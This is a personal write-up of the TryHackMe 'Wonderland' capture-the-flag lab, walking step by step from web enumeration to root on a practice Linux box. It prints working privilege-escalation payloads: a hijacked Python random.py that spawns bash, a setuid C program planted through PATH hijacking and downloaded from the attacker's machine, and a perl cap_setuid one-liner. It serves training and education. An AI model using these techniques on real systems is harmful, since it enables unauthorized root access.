---
title: "Wonderland(THM)"
permalink: /writeups/wonderland
---

# <a href="https://www.tryhackme.com/room/wonderland" target="_blank">Wonderland - THM</a>

## Tags
ctf, alice in wonderland, privesc, linux

## Metadata

| Written | 08/07/2022
| Author | Thetvdh
| Platform | TryHackMe
| Box Type | Linux

## Tools used

- nmap
- ffuf
- seclists
- ssh
- gcc
- cURL
- vim
- python
- wget
- strings
- linpeas

### Note : For the purposes of this box the target IP was 10.10.242.220

# Enumeration

First I started out with a nmap scan on the box

`nmap -sTVC -T4 -p- -o nmap.txt 10.10.242.220`

```
Nmap scan report for 10.10.242.220
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  8 06:33:45 2022 -- 1 IP address (1 host up) scanned in 48.97 seconds
```

Not a large amount to go on here so decided to get the HTTP headers just in case there was something hidden.

`curl -I 10.10.242.220`

```
Length: 402
Content-Type: text/html; charset=utf-8
Last-Modified: Mon, 01 Jun 2020 22:45:08 GMT
Date: Fri, 08 Jul 2022 10:34:57 GMT
```

Again nothing interesting, lets have a look at the website

# Port 80

Upon opening the site we're greeted with not a lot. 

![A picture of the sites default page](/writeups/wonderland/index.JPG "Site Default")

A quick check of the page source didn't reveal anything either so I decided to run a directory scan using ffuf.

`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.242.220/FUZZ`

This led to a interesting discovery of a directory named /r. So I ran a scan on this as well

`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.242.220/r/FUZZ`

Which led to a directory called /a. At this point I decided to run a recursive scan to automate the procedure

`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.242.220/r/a/FUZZ -recursion`

Eventually, after going down the rabbit hole for a bit the scan finishes and had found a collection of directories that spelt out "rabbit"

http://10.10.242.220/r/a/b/b/i/t

Opening this page appeared to reveal nothing at all, but upon viewing the page source we see a hidden element with what appears to be a username and password.


![A censored picture of the credentials found in the source](/writeups/wonderland/pagesourcecreds.JPG "Censored Creds")

We know port 22 is open so lets try SSHing into the machine

#### (From this point in the writeup I will be assuming you found the username and password and will not be censoring them)

`ssh alice@10.10.242.220`

It worked and we are now connected, let's work on escalating our privleges

# Privilege Escalation - Alice

First thing I always do is check for SUID bits, it's a nice easy command and can sometimes find something interesting.

`find / -perm -u=s -type f 2>/dev/null`

This produced no binaries of interest so I moved on to checking sudo perms

`sudo -l`

![Output of the sudo -l command](/writeups/wonderland/sudol.JPG "Sudo output")

This is good. It shows us we can run that python script as the rabbit user so let's try it and see what it does.

It appears to print some nonsense out so let's have a look at the contents using everyone's favourite editor, **vim**

`vim walrus_and_the_carpenter.py`

![Image of the for loop in the python file](/writeups/wonderland/forloopcarpenter.JPG "Python file")

This for loop appears to choose a random line from the massive poem and print it out. Nothing we can really exploit here, not to mention we do not have write permissions for this script so we cannot edit it.

This stumped me for a while as it was obvious this was the route the box author intended but how can we exploit the file when we can't write to it. **DING** lightbulb moment. I have a massive folder full of python files and a while back I named on random.py. This caused all the other files in that directory to import that random.py rather than the python module. I theorised that this would happen on this box as well so lets try it.

`vim random.py`
```python
import pty

pty.spawn("/bin/bash")
```

`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

It worked! I how have a shell as the rabbit user.

## Linpeas

Before moving any further, I decided to run linpeas to check for any quick and easy vectors. Linpeas can be downloaded from [here](https://github.com/carlospolop/PEASS-ng/releases)

Letting linpeas run it found 2 99% vectors for privesc. One was pwnkit (which I consider cheating on most boxes as it is a fairly new exploit and nearly all old boxes are vulnerable to it) and the actual vector which is perl. 

Perl has cap_setuid+ep set as a capability which allows perl to change uid's. This means that we can escalate our privileges to root by changing our UID to 0!

![Perl UID](/writeups/wonderland/Capabilities.JPG "Capbilities")

So we go to GTFO bins and find this command

`./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

Some minor editing to use the correct perl

`/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

Run this and ... It didn't work

I thought to check the file permissions and found my answer, perl is not exectuable by world, only by the owner and the group. Hatter is the group and also one of the other users so hatter is where we need to end up.

![Perl File permissions](/writeups/wonderland/perlperms.JPG "Perl Perms")


# Privilege Escalation - rabbit

First lets get to rabbit's home directory

`cd /home/rabbit`
`ls -la`

The file teaParty is there. Attempting to cat out the file gives us a bunch of gibberish so it is a compiled file.

What is interesting about the teaParty file is that the SUID bit is set meaning that when we run the file it will execute as a different user. You can read more about SUID bits [here](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit)

Running the file gives us the following output
![Output of executing the teaParty executable](/writeups/wonderland/teaparty.JPG "teaParty Executable")

What is interesting is it appears to give the exact date and time that the program was run at. This most likely means it is calling the date utility. To double check though I downloaded the file and ran strings on it.

#### Victim Machine

`python3 -m http.server 8080`

#### Attacker machine

`wget http://10.10.242.220/teaParty`

`strings teaParty`

Running strings confimed my suspicion that date was being run with this line

```
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
```

## Exploiting the path

Again we cannot write to the teaParty executable so we have to exploit the part we can influence

date in the program is not correctly called as it does not give an absolute path, this means we can inject our own code into the date program by manipulating the PATH to make linux look there first.

#### Victim machine

1. `cd /home/rabbit`
2. `mkdir bin`
3. `cd bin`
4. `export PATH="/home/rabbit/bin:$PATH"`

#### Attackers machine

5. `vim exploit.c`
6. ```C
   int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
   }
   ```
7. `gcc exploit.c -o date -w`
8. `python3 -m http.server 80`

#### Victim Machine

9. `wget http://*attackers-ip*/date`
10. `chmod +x date`
11. `cd ..`
12. `./teaParty`

After running all these steps I got a session as hatter

# Privilege Escalation - Hatter

We are now hatter! We know from our linpeas scan earlier we can run perl but let's have a look first to see if user.txt is here. We haven't come across it yet and I assume one of the users must have it

After changing to hatters home directory and listing the contents we find a password.txt file, no user flag though.

At a guess that is hatters ssh password but at first I was slightly confused why we needed this. It became apparent later but we'll get to that.

Let's try the perl command again:

`/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

Again, it didn't work. This is when I discovered why we were given the ssh password.

Running the `id` command gave the following output

`uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)`

While we were the hatter user we were not in the hatter group. So let's disconnect and log back in with the hatter's creds.

ssh hatter@10.10.242.220

Let's double check to see our group is correct

`uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)`

We are now in the hatter group so let's find out if the perl exploit works now.

`/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

**BOOM** We are now root!

Running id confirms this

`uid=0(root) gid=1003(hatter) groups=1003(hatter)`

Let's now find the flags

find / -name user.txt
find / -name root.txt

We find the user.txt flag in /root and the root.txt flag in /home/alice

There we have it, one rooted box.

# Conclusion

Wonderland is a great box for practicing your privlege escalation skills. It walks you through it without actually telling you what to do by directing you, in it's own words, down a rabbit hole. For users of gobuster over ffuf or dirbuster, the small web element must have been infuriating as gobuster doesn't have a recursive mode so manually running the command six times might have become annoying. 

If you enjoyed this writeup please consider giving my Twitter a follow [@Thetvdh1](https://twitter.com/Thetvdh1). I rarely post anything original and it's mainly retweets but I may start in the future.

This was my first ever writeup and I think it was a good place to start as the box itself was quite intricate but also linear so I wasn't bouncing all the place between different parts.

Thank you again for reading and I hope this has been helpful!




